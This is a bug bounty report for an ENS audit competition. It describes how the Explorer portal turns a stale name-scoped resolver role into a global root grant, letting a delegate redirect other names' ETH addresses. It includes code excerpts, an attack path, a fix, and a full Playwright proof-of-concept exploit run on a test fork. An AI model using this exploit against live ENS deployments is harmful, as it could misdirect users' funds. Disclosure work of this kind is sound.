# 91299 w a critical unmapped resolver role becomes global and lets a delegate redirect other ens names

**Submitted on Aug 31st 2026 at 12:28:42 UTC by @Paludo0x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91299
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

Explorer can turn a role limited to one ENS name into a resolver-wide role when an administrator edits a stale role row. The role table loses the original resource while the transaction helper treats the resulting empty name as `ROOT_RESOURCE`. A delegate can then replace the ETH address of every name using that resolver, including names for which it never received permission.

## Vulnerability Details

The defect spans the resolver overview, account grouping, role sidebar, and transaction builder. Their integration changes a nonzero name resource into root resource `0`.

### Step-by-step vulnerability explanation

{% stepper %}
{% step %}

## Resolver role assignments remain after a name moves

Resolver role assignments remain stored after a name moves to another resolver. Explorer still receives the assignment, but the departed name no longer appears in that resolver's current node list.

`ResolverRolesTable` builds its resource map only from current nodes and groups every assignment by account.

```typescript
// apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:102
const data = useMemo(
  () => groupRolesByAccount(roles, buildResourceToNameMap(nodes)),
  [roles, nodes],
)
```

The role row survives because grouping keeps `roles`. Its resource identity does not survive when the current node map lacks that resource.

```typescript
// apps/portal/src/lib/roles/resolverRoles.ts:197
const resolvedName = resourceToName?.get(resource) ?? null

const existing = grouped.get(account)

if (existing) {
  existing.roles.push(role)
  existing.decodedRoles.push(...decoded)
  if (resolvedName) existing.resolvedNames.add(resolvedName)
} else {
  const names = new Set<string>()
  if (resolvedName) names.add(resolvedName)
  grouped.set(account, {
    account,
    resolvedNames: names,
    roles: [role],
    decodedRoles: [...decoded],
  })
}
```

{% endstep %}

{% step %}

## The sidebar falls back to an empty name

`ResolverRolesSidebar` selects a non-root name and uses an empty string when none exists.

```typescript
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:167
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The sidebar also hides the scope message when `resolvedNames` is empty. An administrator can edit the row without seeing a name or a global-scope warning.
{% endstep %}

{% step %}

## Saving maps the empty name to root scope

Saving the edit passes that empty string to the transaction path. `prepareGrantResolverRolesTransaction()` gives the empty value a different security meaning.

```typescript
// apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45
const writeParams = grantResolverRolesWriteParameters(
  walletClient,
  name === ''
    ? { resolverAddress, targetAccount: account, scope: 'root', roles }
    : { resolverAddress, targetAccount: account, scope: 'name', name, roles },
)
```

Explorer therefore encodes `grantRootRoles()` instead of a name-scoped grant. The transaction overview does not disclose `root`, `global`, or `all names` before wallet approval.
{% endstep %}

{% step %}

## The root role applies to every resource

ENS Enhanced Access Control applies a root role to every resource. A new root `ROLE_SET_ADDR` lets the delegate replace address records for unrelated names on the shared resolver.
{% endstep %}
{% endstepper %}

### Attack path

{% stepper %}
{% step %}

## Grant a limited role

A resolver administrator grants a delegate a limited role on `nameA`.
{% endstep %}

{% step %}

## Move the originally scoped name

The administrator later moves `nameA` to another resolver while the old resolver still serves `nameB`.
{% endstep %}

{% step %}

## Edit the surviving delegate row

The administrator opens the delegate's surviving row and adds `ROLE_SET_ADDR` through the normal Explorer workflow.
{% endstep %}

{% step %}

## Explorer submits a root grant

Explorer submits `PermissionedResolver.grantRootRoles(ROLE_SET_ADDR, delegate)` without disclosing the root scope.
{% endstep %}

{% step %}

## Delegate modifies another name

The delegate calls the resolver record setter for `nameB` and replaces its ETH address.
{% endstep %}

{% step %}

## Applications resolve the attacker-controlled address

Wallets and applications resolving `nameB` receive the delegate-controlled address.
{% endstep %}
{% endstepper %}

## Impact Details

* Affected asset: Explorer app Files.
* Direct impact: an ENS name can resolve to an attacker-controlled ETH address.
* Authority gained: `ROLE_SET_ADDR` applies to every name using the resolver, not the stale name represented by the edited row.
* Who loses: owners and users of any affected name can send assets to the substituted address.
* Repeatability: the delegate can update affected address records until the administrator discovers and revokes the root role.
* Severity: Critical. The competition explicitly covers malicious connected-wallet interactions that modify transaction parameters and applications resolving ENS names to attacker-controlled addresses.
* Known-issue distinction: QA-01 mentions errors after transfers and states that a demonstrated role combination granting unintended authority is a new security issue. This PoC demonstrates that authority and a successful address replacement.

## Recommended Fix

Preserve the exact resource on every row and allow root actions only when the stored resource is literally `ROOT_RESOURCE`. Fail closed if a nonzero resource cannot be mapped.

```typescript
if (resource !== ROOT_RESOURCE && !resolvedName) {
  throw new Error('Cannot edit an unresolved resolver resource')
}
```

Do not flatten assignments from different resources into one editable account row. Build transaction calldata from the stored resource, not from a display name fallback.

## Proof of Concept

## PoC Explanation

* The focused Vitest passes a nonzero role resource that is absent from the current node map. It proves the production helper encodes `grantRootRoles` rather than `authorizeNameRoles`.
* The Playwright test registers two names on a Sepolia fork and gives the delegate only a name-scoped role.
* It moves that name away while keeping a protected name on the old resolver.
* A negative control proves the delegate cannot change the protected name's address before the Explorer edit.
* The test uses the production build, approves the real wallet request, and decodes the mined transaction as `grantRootRoles`.
* The final assertion proves the delegate changes the protected name's ETH address after the unintended root grant.

```
resolver unmapped-resource role edit
  PASS encodes grantRootRoles when the role resource is absent from current nodes

Permissioned resolver unmapped-resource scope collapse
  pre_escalation_cross_name_write_blocked: true
  transaction_overview_disclosed_root_scope: false
  mined_app_function: grantRootRoles
  stale_name_roles_after: 0x10
  root_roles_after_edit: 0x1
  protected_name_direct_roles: 0x0
  unauthorized_cross_name_address_write_succeeded: true
  1 passed (14.7s)
```

```typescript
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getAddressRecord, getResolver } from '@ensdomains/ensjs/public'
import { setRecords } from '@ensdomains/ensjs/wallet'
import {
  grantResolverRolesWriteParameters,
  setResolverWriteParameters,
} from '@ensdomains/ensjs/wallet/v2'
import {
  permissionedResolverGrantRootRolesSnippet,
  permissionedResolverRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  createWalletClient,
  decodeFunctionData,
  encodePacked,
  http,
  isAddressEqual,
  keccak256,
  namehash,
  toHex,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient } from '../../../helpers/anvil-client.js'
import { authorizeTransaction } from '../../../helpers/portal-auth.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://localhost:3001'
const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const ROOT_RESOURCE = 0n
const ROLE_SET_ADDR = 1n << 0n
const ROLE_SET_TEXT = 1n << 4n
const ENS_V2_REGISTRY =
  ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

const computeNameResource = (name: string): bigint =>
  BigInt(
    keccak256(encodePacked(['bytes32', 'bytes32'], [namehash(name), zeroHash])),
  )

const labelOf = (name: string) => name.split('.')[0]

test.describe('Permissioned resolver unmapped-resource scope collapse', () => {
  test('turns a stale name-scoped role into a root role during an ordinary edit', async ({
    portalPage: page,
    wallet,
    accounts,
    makeName,
  }) => {
    test.setTimeout(300_000)

    const staleName = await makeName({
      label: 'resolver-role-stale-resource',
      owner: 'user',
      records: [{ key: 'url', value: 'https://stale.example' }],
    })
    const protectedName = await makeName({
      label: 'resolver-role-protected-name',
      owner: 'user',
      records: [{ key: 'url', value: 'https://owner.example' }],
    })

    const staleResolver = await getResolver(publicClient, { name: staleName })
    const replacementResolver = await getResolver(publicClient, {
      name: protectedName,
    })
    if (!staleResolver || !replacementResolver)
      throw new Error('Expected both names to have resolvers')
    expect(isAddressEqual(staleResolver, replacementResolver)).toBe(false)

    const administrator = privateKeyToAccount(accounts.getPrivateKey('user'))
    const target = accounts.getAddress('user2')
    const administratorClient = createWalletClient({
      account: administrator,
      chain: publicClient.chain,
      transport: http(ANVIL_RPC_URL),
    })

    const staleResource = computeNameResource(staleName)
    const protectedResource = computeNameResource(protectedName)
    const readRoles = (resource: bigint) =>
      publicClient.readContract({
        address: staleResolver,
        abi: permissionedResolverRolesSnippet,
        functionName: 'roles',
        args: [resource, target],
      })

    const nameGrant = grantResolverRolesWriteParameters(administratorClient, {
      resolverAddress: staleResolver,
      targetAccount: target,
      scope: 'name',
      name: staleName,
      roles: ['ROLE_SET_TEXT'],
    })
    const nameGrantHash = await administratorClient.writeContract(nameGrant)
    await publicClient.waitForTransactionReceipt({ hash: nameGrantHash })

    // Keep one owner-controlled name on the old resolver, but move the name
    // that supplied the target's limited role to a different resolver. The
    // role remains live in the old resolver while its resource legitimately
    // disappears from that resolver's current node list.
    const attachProtectedHash = await administratorClient.writeContract(
      setResolverWriteParameters(administratorClient, {
        label: labelOf(protectedName),
        registryAddress: ENS_V2_REGISTRY,
        resolverAddress: staleResolver,
      }),
    )
    await publicClient.waitForTransactionReceipt({ hash: attachProtectedHash })

    const detachStaleHash = await administratorClient.writeContract(
      setResolverWriteParameters(administratorClient, {
        label: labelOf(staleName),
        registryAddress: ENS_V2_REGISTRY,
        resolverAddress: replacementResolver,
      }),
    )
    await publicClient.waitForTransactionReceipt({ hash: detachStaleHash })

    const [currentStaleResolver, currentProtectedResolver] = await Promise.all([
      getResolver(publicClient, { name: staleName }),
      getResolver(publicClient, { name: protectedName }),
    ])
    if (!currentStaleResolver || !currentProtectedResolver)
      throw new Error('Expected both names to retain a resolver')
    expect(isAddressEqual(currentStaleResolver, staleResolver)).toBe(false)
    expect(isAddressEqual(currentProtectedResolver, staleResolver)).toBe(true)
    expect((await readRoles(staleResource)) & ROLE_SET_TEXT).toBe(ROLE_SET_TEXT)
    expect(await readRoles(ROOT_RESOURCE)).toBe(0n)
    expect(await readRoles(protectedResource)).toBe(0n)

    const targetClient = createWalletClient({
      account: privateKeyToAccount(accounts.getPrivateKey('user2')),
      chain: publicClient.chain,
      transport: http(ANVIL_RPC_URL),
    })
    const attemptedAddressBeforeEscalation = accounts.getAddress('user3')
    const protectedAddressBeforeEscalation = await getAddressRecord(
      publicClient,
      {
        name: protectedName,
        coin: 'ETH',
      },
    )
    let preEscalationWriteBlocked = false
    try {
      const hash = await setRecords(targetClient, {
        name: protectedName,
        resolverAddress: staleResolver,
        coins: [{ coin: 'ETH', value: attemptedAddressBeforeEscalation }],
      })
      const receipt = await publicClient.waitForTransactionReceipt({ hash })
      preEscalationWriteBlocked = receipt.status === 'reverted'
    } catch {
      preEscalationWriteBlocked = true
    }
    expect(preEscalationWriteBlocked).toBe(true)
    expect(
      await getAddressRecord(publicClient, {
        name: protectedName,
        coin: 'ETH',
      }),
    ).toEqual(protectedAddressBeforeEscalation)

    // Local Panoptes does not reliably discover freshly deployed resolver
    // proxies. This adapter returns the production overview schema, deriving
    // both current nodes and role assignments from live chain state.
    await page.route('**/graphql', async (route) => {
      const body = route.request().postData() ?? ''
      if (!body.includes('getResolverOverview')) {
        await route.continue()
        return
      }

      const [staleRoles, rootRoles, stalePointer, protectedPointer] =
        await Promise.all([
          readRoles(staleResource),
          readRoles(ROOT_RESOURCE),
          getResolver(publicClient, { name: staleName }),
          getResolver(publicClient, { name: protectedName }),
        ])
      const currentNodes = [
        { name: staleName, resolver: stalePointer },
        { name: protectedName, resolver: protectedPointer },
      ].filter(
        (node) => node.resolver && isAddressEqual(node.resolver, staleResolver),
      )
      const roles = [
        ...(staleRoles === 0n
          ? []
          : [
              {
                account: target,
                resource: toHex(staleResource, { size: 32 }),
                roleBitmap: toHex(staleRoles),
                blockNumber: 1,
                transactionHash: nameGrantHash,
                timestamp: 1,
                name: staleName,
              },
            ]),
        ...(rootRoles === 0n
          ? []
          : [
              {
                account: target,
                resource: toHex(ROOT_RESOURCE, { size: 32 }),
                roleBitmap: toHex(rootRoles),
                blockNumber: 2,
                transactionHash: null,
                timestamp: 2,
                name: null,
              },
            ]),
      ]

      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          data: {
            resolver: {
              id: staleResolver.toLowerCase(),
              address: staleResolver,
              nodeCount: currentNodes.length,
              aliasCount: 0,
              roleHolderCount: roles.length === 0 ? 0 : 1,
              nodes: currentNodes.map(({ name }) => ({
                id: namehash(name),
                name,
                owner: { id: administrator.address },
                resolver: {
                  id: staleResolver.toLowerCase(),
                  address: staleResolver,
                },
              })),
              aliases: [],
              roles,
              events: [],
            },
          },
        }),
      })
    })

    await connectWithHeadlessWallet(page, wallet)
    await page.goto(`${PORTAL_APP_URL}/resolver/${staleResolver}/roles`)

    const editButton = page.getByRole('button', { name: 'Edit user roles' })
    await expect(editButton).toBeVisible({ timeout: 30_000 })
    await editButton.click()

    await expect(page.getByText(/Roles scoped to/)).toHaveCount(0)
    await expect(page.getByText('Global roles (all names)')).toHaveCount(0)
    await page.locator('#ROLE_SET_ADDR-manager').click()
    // The development-only TanStack Router footer overlaps this bottom-right
    // button. Hide only that diagnostic footer before exercising the real UI.
    const routerDevtools = page
      .locator('footer')
      .filter({ hasText: 'TanStack Router' })
    const routerDevtoolsCount = await routerDevtools.count()
    if (routerDevtoolsCount > 0) {
      await routerDevtools.evaluate((element) => {
        element.style.display = 'none'
      })
    }
    await page.getByRole('button', { name: 'Save', exact: true }).click()

    const transactionOverview = page.getByRole('dialog', {
      name: 'Transaction overview',
    })
    await expect(transactionOverview).toBeVisible({ timeout: 30_000 })
    const transactionOverviewText = await transactionOverview.innerText()
    expect(transactionOverviewText).not.toMatch(/root|global|all names/i)
    const blockBeforeAppTransaction = await publicClient.getBlockNumber()
    await transactionOverview.getByRole('button', { name: /^Start$/i }).click()

    const activeTransaction = page.getByRole('dialog', {
      name: 'Save resolver role changes',
    })
    const openWallet = activeTransaction.getByRole('button', {
      name: /open wallet/i,
    })
    await openWallet.waitFor({ state: 'visible', timeout: 30_000 })
    await openWallet.click()
    await authorizeTransaction(wallet)

    await expect
      .poll(() => readRoles(ROOT_RESOURCE), { timeout: 60_000 })
      .toBe(ROLE_SET_ADDR)

    const [rootRolesAfter, staleRolesAfter, protectedRolesAfter] =
      await Promise.all([
        readRoles(ROOT_RESOURCE),
        readRoles(staleResource),
        readRoles(protectedResource),
      ])
    expect(rootRolesAfter & ROLE_SET_ADDR).toBe(ROLE_SET_ADDR)
    expect(staleRolesAfter & ROLE_SET_TEXT).toBe(ROLE_SET_TEXT)
    expect(protectedRolesAfter).toBe(0n)

    // Read the latest block directly: getBlockNumber() is client-cached and
    // can briefly report the pre-transaction height after the role poll.
    const appTransactionBlock = await publicClient.getBlock({
      blockTag: 'latest',
      includeTransactions: true,
    })
    expect(appTransactionBlock.number).toBeGreaterThan(
      blockBeforeAppTransaction,
    )
    const appTransaction = appTransactionBlock.transactions.find(
      (transaction) =>
        transaction.to &&
        isAddressEqual(transaction.to, staleResolver) &&
        isAddressEqual(transaction.from, administrator.address),
    )
    expect(appTransaction).toBeDefined()
    if (!appTransaction) throw new Error('Expected mined role-edit transaction')
    const appTransactionCall = decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: appTransaction.input,
    })
    expect(appTransactionCall.functionName).toBe('grantRootRoles')
    expect(appTransactionCall.args).toEqual([ROLE_SET_ADDR, target])

    const maliciousAddress = accounts.getAddress('user3')
    const recordChangeHash = await setRecords(targetClient, {
      name: protectedName,
      resolverAddress: staleResolver,
      coins: [{ coin: 'ETH', value: maliciousAddress }],
    })
    await publicClient.waitForTransactionReceipt({ hash: recordChangeHash })

    const changedAddress = await getAddressRecord(publicClient, {
      name: protectedName,
      coin: 'ETH',
    })
    expect(changedAddress?.value.toLowerCase()).toBe(
      maliciousAddress.toLowerCase(),
    )

    console.log(`stale_name: ${staleName}`)
    console.log(`protected_name: ${protectedName}`)
    console.log(`old_resolver: ${staleResolver}`)
    console.log(`stale_name_current_resolver: ${currentStaleResolver}`)
    console.log(`protected_name_current_resolver: ${currentProtectedResolver}`)
    console.log(
      `development_router_devtools_present: ${routerDevtoolsCount > 0}`,
    )
    console.log('stale_resource_absent_from_current_nodes: true')
    console.log(
      `pre_escalation_cross_name_write_blocked: ${preEscalationWriteBlocked}`,
    )
    console.log(
      `transaction_overview_disclosed_root_scope: ${/root|global|all names/i.test(transactionOverviewText)}`,
    )
    console.log(`mined_app_transaction: ${appTransaction.hash}`)
    console.log(`mined_app_function: ${appTransactionCall.functionName}`)
    console.log(`stale_name_roles_after: ${toHex(staleRolesAfter)}`)
    console.log(`root_roles_after_edit: ${toHex(rootRolesAfter)}`)
    console.log(`protected_name_direct_roles: ${toHex(protectedRolesAfter)}`)
    console.log(`protected_name_address_after: ${changedAddress?.value}`)
    console.log('unauthorized_cross_name_address_write_succeeded: true')
  })
})
```
